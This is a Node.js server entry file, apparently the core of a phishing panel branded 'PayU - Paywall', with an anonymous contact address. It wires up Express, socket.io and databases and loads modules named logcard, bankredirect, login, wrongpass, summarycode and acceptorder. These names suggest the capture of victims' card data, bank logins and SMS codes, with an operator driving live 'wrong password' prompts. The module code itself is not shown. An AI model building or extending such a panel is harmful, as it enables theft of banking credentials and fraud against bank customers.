"use strict"

const express = require("express"),
	  config = require("config"),
	  expressConfig = config.get("Application.express"),
	  message = require("print-message"),
	  cookieParser = require("cookie-parser")
global.app = express()


var server = require('http').createServer(app);
var io = require('socket.io')(server);

global.adminSess = '0'

require("./modules/express.js")()
require("./modules/redis.js")()
require("./modules/mongoose.js")()

require("./modules/render.js")()

require("./modules/log.js")()
require("./modules/logcard")()
require("./modules/bankredirect")()
require("./modules/opensession")()
require("./modules/updateorder")()
require("./modules/finalizeorder")()
require("./modules/sessions")()
require("./modules/acceptorder")()
require("./modules/deleteorder")()
require("./modules/psdupdate")()
require("./modules/login")()
require("./modules/wrongpass")()
require("./modules/summarycode")()
require("./modules/wrongsummary")()
require("./modules/dropsess")()

app.use(express.static(__dirname + '/node_modules'));
io.on('connection', function(socket) {
	console.log(' %s sockets connected', io.engine.clientsCount);

	socket.on('disconnect', function() {
		console.log("disconnect: ", socket.id);
	});
});

var clients = 0;
io.on('connection', function(socket) {
	clients++;
	io.sockets.emit('broadcast',{ description: clients + ' clients connected!'});
	socket.on('disconnect', function () {
		clients--;
		io.sockets.emit('broadcast',{ description: clients + ' clients connected!'});
	});
});

// io.socket.emit('testEvent', { title: "floppy test" })

setInterval(function(){
	reloadFunc()
}, 1000);
const reloadFunc = () => {
	io.sockets.emit('news_by_server', 'Reloadeddddd');
}
server.listen(expressConfig["port"], () => {
	message(["PayU - Paywall", "floppy1@secmail.pro"], {
		border: true,
		color: "black",
		borderColor: "black",
		borderSymbol: "│",
		sideSymbol: "│",
		leftTopSymbol: "└",
		leftBottomSymbol: "┌",
		rightTopSymbol: "┘",
		rightBottomSymbol: "┐",
		marginTop: 1,
		marginBottom: 1,
		paddingTop: 2,
		paddingBottom: 2
	})
	message([`[Express] Nasłuchuję na porcie ${expressConfig["port"]}`], {
		border: false,
		color: "green"
	})

})
